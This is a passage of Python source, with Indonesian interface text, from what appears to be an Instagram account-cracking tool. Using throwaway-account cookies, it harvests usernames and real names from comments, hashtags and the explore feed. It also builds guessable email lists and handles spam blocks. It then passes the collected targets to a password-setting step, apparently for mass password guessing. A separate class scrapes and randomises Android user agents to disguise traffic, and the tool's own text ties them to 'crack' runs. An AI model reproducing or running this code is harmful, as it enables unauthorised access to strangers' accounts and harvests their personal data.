                elif 'Please wait' in str(response.text) or 'Harap tunggu' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Terkena Spam Hidupkan Mode Pesawat!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terkena Spam) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif '"spam":true,' in str(response.text) or '"spam": true,' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Telah Terblokir Silahkan Ganti Akun!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    for z in json.loads(response.text)['users']:
                        self.username, self.nama = z['username'], z['full_name']
                        if str(self.username) in str(Dump):
                            continue
                        else:
                            Dump.append(f'{self.username}|{self.nama}')
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump @{str(self.username)[:20]}/{len(Dump)} Username...     ", end='\r')
                            time.sleep(0.007)
                    return 0
        except (KeyboardInterrupt):
            Console().print("                                                             ", end='\r')
            if len(Dump) > 50:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Komentar(self, cookies, media_url, media_id, url_params):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'sec-fetch-mode': 'cors',
                    'referer': 'https://www.instagram.com/p/{}'.format(media_url.split('https://www.instagram.com/p/')[1]),
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                response = r.get('https://www.instagram.com/api/v1/media/{}/comments/{}'.format(media_id, url_params), cookies = {
                    'cookie': cookies
                })
                if 'login_required' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Kamu Telah Terlogout Sailahkan Login Ulang!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terlogout) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif 'Please wait' in str(response.text) or 'Harap tunggu' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Terkena Spam Hidupkan Mode Pesawat!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terkena Spam) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif '"spam":true,' in str(response.text) or '"spam": true,' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Telah Terblokir Silahkan Ganti Akun!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    for z in json.loads(response.text)['comments']:
                        self.username, self.nama = z['user']['username'], z['user']['full_name']
                        if str(self.username) in str(Dump):
                            continue
                        else:
                            Dump.append(f'{self.username}|{self.nama}')
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump @{str(self.username)[:20]}/{len(Dump)} Username...     ", end='\r')
                            time.sleep(0.0007)
                    if 'cached_comments_cursor' in str(response.text) and 'bifilter_token' in str(response.text):
                        self.cached_comments_cursor = re.search('{"cached_comments_cursor": "(\d+)"', str(json.loads(response.text)['next_min_id'])).group(1)
                        self.bifilter_token = re.search('"bifilter_token": "(.*?)"', str(json.loads(response.text)['next_min_id'])).group(1)
                        self.Komentar(cookies, media_url, media_id, '?can_support_threading=true&min_id=%7B%22cached_comments_cursor%22%3A%20%22{}%22%2C%20%22bifilter_token%22%3A%20%22{}%22%7D'.format(self.cached_comments_cursor, urllib.request.quote(self.bifilter_token)))
                    elif not 'cached_comments_cursor' in str(response.text) and 'bifilter_token' in str(response.text):
                        self.bifilter_token = re.search('"bifilter_token": "(.*?)"', str(json.loads(response.text)['next_min_id'])).group(1)
                        self.Komentar(cookies, media_url, media_id, '?can_support_threading=true&min_id=%7B%22bifilter_token%22%3A%20%22{}%22%7D'.format(urllib.request.quote(self.bifilter_token)))
                    else:
                        return 0
        except (KeyboardInterrupt):
            Console().print("                                                             ", end='\r')
            if len(Dump) >= 9:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Hastag(self, cookies, hastag, page, max_id):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'origin': 'https://www.instagram.com',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'Host': 'www.instagram.com',
                    'sec-fetch-mode': 'cors',
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'referer': 'https://www.instagram.com/explore/tags/{}/'.format(hastag),
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                data = {
                    'include_persistent': 0,
                    'max_id': max_id,
                    'page': page,
                    'surface': 'grid',
                    'tab': 'recent'
                }
                response = r.post('https://www.instagram.com/api/v1/tags/{}/sections/'.format(hastag), data = data, cookies = {
                    'cookie': cookies
                })
                if 'login_required' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Kamu Telah Terlogout Sailahkan Login Ulang!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terlogout) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif 'Please wait' in str(response.text) or 'Harap tunggu' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Terkena Spam Hidupkan Mode Pesawat!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terkena Spam) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif '"spam":true,' in str(response.text) or '"spam": true,' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Telah Terblokir Silahkan Ganti Akun!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    self.finds_name = re.findall('"full_name":"(.*?)",', str(response.text))
                    self.finds_username = re.findall('"username":"(.*?)"', str(response.text))
                    if len(self.finds_username) == 0 and len(self.finds_name) == 0:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Tidak Ada Pengguna Yang Ditemukan...", end='\r')
                        time.sleep(5.5)
                        return 0
                    else:
                        for z in range(len(self.finds_username)):
                            try:
                                self.username, self.nama = self.finds_username[z], self.finds_name[z]
                                if str(self.username) in str(Dump) or len(self.username) > 30 or len(self.nama) > 30:
                                    continue
                                else:
                                    Dump.append(f'{self.username}|{self.nama}')
                                    Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump @{str(self.username)[:20]}/{len(Dump)} Username...     ", end='\r')
                                    time.sleep(0.0007)
                            except (Exception):
                                continue
                        if 'next_max_id' in str(response.text) and 'next_page' in str(response.text):
                            self.find_next = re.search(',"next_max_id":"(.*?)","next_page":(\d+),"next_media_ids":.*?,"status":"ok"}', str(response.text))
                            self.Hastag(cookies, hastag, self.find_next.group(1), self.find_next.group(2))
                        else:
                            return 0
        except (KeyboardInterrupt):
            Console().print("                                                             ", end='\r')
            if len(Dump) >= 9:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Email(self, name, domain):
        try:
            for angka in range(0, 999):
                self.email, self.nama = f'{name}{angka}{domain}', f'{name} {angka}'
                if str(self.email) in str(Dump):
                    continue
                else:
                    Dump.append(f'{self.email}|{self.nama}')
                    Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump {str(self.email)[:20]}/{len(Dump)} Username...     ", end='\r')
                    time.sleep(0.0007)
            return 0
        except (KeyboardInterrupt):
            Console().print("                                                             ", end='\r')
            if len(Dump) >= 49:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Explore(self, cookies, max_id):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'referer': 'https://www.instagram.com/explore/',
                    'sec-fetch-mode': 'cors',
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                response = r.get('https://www.instagram.com/api/v1/discover/web/explore_grid/?is_prefetch=false&omit_cover_media=false&module=explore_popular&include_fixed_destinations=true&max_id={}'.format(max_id), cookies = {
                    'cookie': cookies
                })
                if 'login_required' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Kamu Telah Terlogout Sailahkan Login Ulang!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terlogout) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif 'Please wait' in str(response.text) or 'Harap tunggu' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Terkena Spam Hidupkan Mode Pesawat!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terkena Spam) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif '"spam":true,' in str(response.text) or '"spam": true,' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Telah Terblokir Silahkan Ganti Akun!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    self.finds_username = re.findall('\'username\': \'(.*?)\'', str(json.loads(response.text)))
                    self.finds_name = re.findall('\'full_name\': \'(.*?)\',', str(json.loads(response.text)))
                    if len(self.finds_username) == 0 and len(self.finds_name) == 0:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Tidak Ada Pengguna Yang Ditemukan...", end='\r')
                        time.sleep(5.5)
                        return 0
                    else:
                        for z in range(len(self.finds_username)):
                            try:
                                self.username, self.nama = self.finds_username[z], self.finds_name[z]
                                if str(self.username) in str(Dump) or len(self.nama) == 0 or len(self.username) > 30:
                                    continue
                                else:
                                    Dump.append(f'{self.username}|{self.nama}')
                                    Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump @{str(self.username)[:20]}/{len(Dump)} Username...     ", end='\r')
                                    time.sleep(0.0007)
                            except (Exception):
                                continue
                        if 'next_max_id' in str(response.text):
                            self.next_max_id = json.loads(response.text)['next_max_id']
                            self.Explore(cookies, self.next_max_id)
                        else:
                            return 0
        except (KeyboardInterrupt):
            Console().print("                                                             ", end='\r')
            if len(Dump) >= 9:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                exit()

class Generate_Useragent:

    def __init__(self) -> None:
        pass

    def Scraping(self, device_model):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'Host': 'whatmyuseragent.com',
                    'accept-language': 'id,en-US;q=0.9,en;q=0.8',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                })
                response = r.get('https://whatmyuseragent.com/brand').text
                self.search_device = re.search('/brand/(\w+)/{}">'.format(str(device_model)), str(response)).group(1)
                response2 = r.get('https://whatmyuseragent.com/brand/{}/{}'.format(self.search_device, device_model)).text
                self.all_device = re.findall('class="list-group-item"><a href="(.*?)"', str(response2))
                for z in self.all_device:
                    response3 = r.get('https://whatmyuseragent.com/{}'.format(z)).text
                    self.search_useragent = re.findall('class="useragent">(.*?)</td>', str(response3))
                    for x in self.search_useragent:
                        if str(x) not in str(open('Data/Useragent.txt', 'r').read().splitlines()):
                            open('Data/Useragent.txt', 'a+').write(f'{x}\n')
                            Console().print(f"[bold royal_blue1]   ╰─>[bold green] Dump {str(len(open('Data/Useragent.txt', 'r').readlines()))} Useragent...         ", end='\r')
                            time.sleep(0.0007)
                        else:
                            continue
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan[italic green] {len(open('Data/Useragent.txt','r').read().splitlines())}[italic white] Useragent Silahkan Crack Pilih Useragent File Dan Masukan File Ini Pastikan Jumlah Useragent[italic red] Lebih Dari Satu[italic white], File Tersimpan Di[italic green] Data/Useragent.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Scraping Selesai) [bold green]<[bold yellow]<[bold red]<"))
                Console().input("[bold white][[bold green]Kembali[bold white]]")
                Menu().Utama(List = [])
        except (KeyboardInterrupt):
            Console().print("                                                             ", end='\r')
            if len(str(len(open('Data/Useragent.txt', 'r').readlines()))) > 1:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan[italic green] {len(open('Data/Useragent.txt','r').read().splitlines())}[italic white] Useragent Silahkan Crack Pilih Useragent File Dan Masukan File Ini Pastikan Jumlah Useragent[italic red] Lebih Dari Satu[italic white], File Tersimpan Di[italic green] Data/Useragent.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Scraping Selesai) [bold green]<[bold yellow]<[bold red]<"))
                Console().input("[bold white][[bold green]Kembali[bold white]]")
                Menu().Utama(List = [])
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Useragent Yang Terkumpul Terlalu Sedikit, Cari Device Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        except (RequestException):
            Console().print("[bold royal_blue1]   ╰─>[bold yellow] Koneksi Error...", end='\r')
            time.sleep(7.5)
            self.Scraping(device_model)

    def Android_Useragent(self):
        self.browser_version = random.choice(['113.0.5672.132', '113.0.5672.131', '113.0.5672.77', '113.0.5672.76', '112.0.5615.136', '112.0.5615.135', '112.0.5615.101', '112.0.5615.100', '112.0.5615.48', '112.0.5615.47', '111.0.5563.116', '111.0.5563.115', '111.0.5563.58', '111.0.5563.57', '111.0.5563.49', '111.0.5563.48', '110.0.5481.154', '110.0.5481.153', '110.0.5481.65', '110.0.5481.64', '110.0.5481.63', '110.0.5481.61', '109.0.5414.118', '109.0.5414.117', '109.0.5414.86', '109.0.5414.85', '108.0.5359.128', '108.0.5359.79', '108.0.5359.61', '107.0.5304.141', '107.0.5304.105', '107.0.5304.91', '107.0.5304.54', '106.0.5249.126', '106.0.5249.118', '106.0.5249.79', '106.0.5249.65', '105.0.5195.136', '105.0.5195.124', '105.0.5195.79', '105.0.5195.77', '105.0.5195.68', '104.0.5112.97', '104.0.5112.69', '103.0.5060.129', '103.0.5060.71', '103.0.5060.70', '103.0.5060.53', '102.0.5005.125', '102.0.5005.99', '102.0.5005.98', '102.0.5005.78', '102.0.5005.59', '102.0.5005.58', '101.0.4951.74', '101.0.4951.61', '101.0.4951.41', '101.0.4951.15 ', '100.0.4896.127', '100.0.4896.88'])
        if len(Useragent) == 0:
            self.android_version = random.choice(['12', '11', '13'])
            self.android_model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
            return (self.useragent)
        else:
            for z in Useragent:
                self.jenis = random.choice(z.split(',')).capitalize()
                if self.jenis == 'Instagramcarbon':
                    self.instagram_lite_version = (f'{random.randrange(301, 341)}.0.0.{random.randrange(1, 15)}.{random.randrange(97, 113)}')
                    self.FBBV = random.randint(00000000, 99999999)
                    self.android_version = random.choice(['9', '10', '11'])
                    self.android_model = random.choice(['RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
